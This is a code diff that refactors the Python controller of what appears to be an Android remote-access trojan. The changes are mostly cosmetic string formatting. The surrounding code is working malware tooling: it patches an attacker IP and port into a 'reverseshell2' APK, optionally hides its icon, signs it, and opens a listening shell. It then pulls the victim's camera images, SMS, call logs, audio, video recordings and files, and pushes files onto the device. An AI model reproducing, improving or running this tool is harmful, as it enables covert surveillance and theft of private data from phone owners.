@@ -36,8 +36,7 @@ def stdOutput(type_=None):
     if type_=="warning":col="33m";str="WARNING"
     if type_=="success":col="32m";str="SUCCESS"
     if type_ == "info":return "\033[1m[\033[33m\033[0m\033[1m\033[33mINFO\033[0m\033[1m] "
-    message = "\033[1m[\033[31m\033[0m\033[1m\033["+col+str+"\033[0m\033[1m]\033[0m "
-    return message
+    return "\033[1m[\033[31m\033[0m\033[1m\033["+col+str+"\033[0m\033[1m]\033[0m "
 
 
 def animate(message):
@@ -65,8 +64,7 @@ def is_valid_ip(ip):
     return bool(m) and all(map(lambda n: 0 <= int(n) <= 255, m.groups()))
 
 def is_valid_port(port):
-    i = 1 if port.isdigit() and len(port)>1  else  0
-    return i
+    return 1 if port.isdigit() and len(port)>1  else  0
 
 def execute(command):
     return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
@@ -108,8 +106,8 @@ def getImage(client):
     print(stdOutput("info")+"\033[0mTaking Image")
     timestr = time.strftime("%Y%m%d-%H%M%S")
     flag=0
-    filename ="Dumps"+direc+"Image_"+timestr+'.jpg'
-    imageBuffer=recvall(client) 
+    filename = f"Dumps{direc}Image_{timestr}.jpg"
+    imageBuffer=recvall(client)
     imageBuffer = imageBuffer.strip().replace("END123","").strip()
     if imageBuffer=="":
         print(stdOutput("error")+"Unable to connect to the Camera\n")
@@ -129,7 +127,7 @@ def readSMS(client,data):
     print(stdOutput("info")+"\033[0mGetting "+data+" SMS")
     msg = "start"
     timestr = time.strftime("%Y%m%d-%H%M%S")
-    filename = "Dumps"+direc+data+"_"+timestr+'.txt'
+    filename = f"Dumps{direc}{data}_{timestr}.txt"
     flag =0
     with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
         msg = recvall(client)
@@ -143,7 +141,7 @@ def readSMS(client,data):
     	os.remove(filename)
 
 def getFile(filename,ext,data):
-    fileData = "Dumps"+direc+filename+"."+ext
+    fileData = f"Dumps{direc}{filename}.{ext}"
     flag=0
     with open(fileData, 'wb') as file:
         try:
@@ -158,8 +156,7 @@ def getFile(filename,ext,data):
 
 def putFile(filename):
     data = open(filename, "rb").read()
-    encoded = base64.b64encode(data)
-    return encoded
+    return base64.b64encode(data)
 
 def shell(client):
     msg = "start"
@@ -172,18 +169,21 @@ def shell(client):
             msg1 = msg1.replace("\nEND123\n","")
             filedata = msg1.split("|_|")
             getFile(filedata[0],filedata[1],filedata[2])
-            
+
         if "putFile" in msg:
             msg=" "
-            sendingData=""
             filename = command.split(" ")[1].strip()
             file = pathlib.Path(filename)
             if file.exists():
                 encoded_data = putFile(filename).decode("UTF-8")
                 filedata = filename.split(".")
+                sendingData=""
                 sendingData+="putFile"+"<"+filedata[0]+"<"+filedata[1]+"<"+encoded_data+"END123\n"
                 client.send(sendingData.encode("UTF-8"))
-                print(stdOutput("success")+f"Succesfully Uploaded the file \033[32m{filedata[0]+'.'+filedata[1]} in /sdcard/temp/")
+                print(
+                    stdOutput("success")
+                    + f"Succesfully Uploaded the file \033[32m{filedata[0]}.{filedata[1]} in /sdcard/temp/"
+                )
             else:
                 print(stdOutput("error")+"File not exist")
 
@@ -192,7 +192,7 @@ def shell(client):
             return
         msg = msg.split("\n")
         for i in msg[:-2]:
-            print(i)   
+            print(i)
         print(" ")
         command = input("\033[1m\033[36mandroid@shell:~$\033[0m \033[1m")
         command = command+"\n"
@@ -231,8 +231,7 @@ def recvallShell(sock):
             data = sock.recv(4096).decode("UTF-8","ignore")
             buff+=data
         else:
-            buff="bogus"
-            return buff
+            return "bogus"
     return buff
 
 def stopAudio(client):
@@ -240,9 +239,9 @@ def stopAudio(client):
     timestr = time.strftime("%Y%m%d-%H%M%S")
     data= ""
     flag =0
-    data=recvall(client) 
+    data=recvall(client)
     data = data.strip().replace("END123","").strip()
-    filename = "Dumps"+direc+"Audio_"+timestr+".mp3"
+    filename = f"Dumps{direc}Audio_{timestr}.mp3"
     with open(filename, 'wb') as audio:
         try:
             audioData = base64.b64decode(data)
@@ -261,9 +260,9 @@ def stopVideo(client):
     timestr = time.strftime("%Y%m%d-%H%M%S")
     data= ""
     flag=0
-    data=recvall(client) 
+    data=recvall(client)
     data = data.strip().replace("END123","").strip()
-    filename = "Dumps"+direc+"Video_"+timestr+'.mp4' 
+    filename = f"Dumps{direc}Video_{timestr}.mp4"
     with open(filename, 'wb') as video:
         try:
             videoData = base64.b64decode(data)
@@ -273,14 +272,14 @@ def stopVideo(client):
             flag = 1
             print(stdOutput("error")+"Not able to decode the Video File\n")
     if flag == 1:
-        os.remove("Video_"+timestr+'.mp4')
+        os.remove(f"Video_{timestr}.mp4")
 
 def callLogs(client):
     print(stdOutput("info")+"\033[0mGetting Call Logs")
     msg = "start"
     timestr = time.strftime("%Y%m%d-%H%M%S")
     msg = recvall(client)
-    filename = "Dumps"+direc+"Call_Logs_"+timestr+'.txt'
+    filename = f"Dumps{direc}Call_Logs_{timestr}.txt"
     if "No call logs" in msg:
     	msg.split("\n")
     	print(msg.replace("END123","").strip())
@@ -354,13 +353,17 @@ def connection_checker(socket,queue):
 
 
 def build(ip,port,output,ngrok=False,ng=None,icon=None):
-    editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
+    editor = f"Compiled_apk{direc}smali{direc}com{direc}example{direc}reverseshell2{direc}config.smali"
     try:
         file = open(editor,"r").readlines()
         #Very much uncertaninity but cant think any other way to do it xD
         file[18]=file[18][:21]+"\""+ip+"\""+"\n"
         file[23]=file[23][:21]+"\""+port+"\""+"\n"
-        file[28]=file[28][:15]+" 0x0"+"\n" if icon else file[28][:15]+" 0x1"+"\n"
+        file[28] = (
+            f"{file[28][:15]} 0x0" + "\n"
+            if icon
+            else f"{file[28][:15]} 0x1" + "\n"
+        )
         str_file="".join([str(elem) for elem in file])
         open(editor,"w").write(str_file)
     except Exception as e:
@@ -373,7 +376,13 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     print(stdOutput("info")+"\033[0mGenerating APK")
     outFileName = output if output else "karma.apk"
     que = queue.Queue()
-    t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
+    t = threading.Thread(
+        target=executeCMD,
+        args=[
+            f"java -jar Jar_utils/apktool.jar b Compiled_apk  -o {outFileName}",
+            que,
+        ],
+    )
     t.start()
     while t.is_alive(): animate("Building APK ")
     t.join()
@@ -382,7 +391,13 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     if not resOut.returncode:
         print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
         print(stdOutput("info")+"\033[0mSigning the apk")
-        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
+        t = threading.Thread(
+            target=executeCMD,
+            args=[
+                f"java -jar Jar_utils/sign.jar -a {outFileName} --overwrite",
+                que,
+            ],
+        )
         t.start()
         while t.is_alive(): animate("Signing Apk ")
         t.join()
@@ -392,7 +407,7 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
             print(stdOutput("success")+"Successfully signed the apk \033[1m\033[32m"+outFileName+"\033[0m")
             if ngrok:
                 clear()
-                get_shell("0.0.0.0",8000) if not ng else get_shell("0.0.0.0",ng)
+                get_shell("0.0.0.0",ng) if ng else get_shell("0.0.0.0",8000)
             print(" ")
         else:
             print("\r"+resOut.stderr)
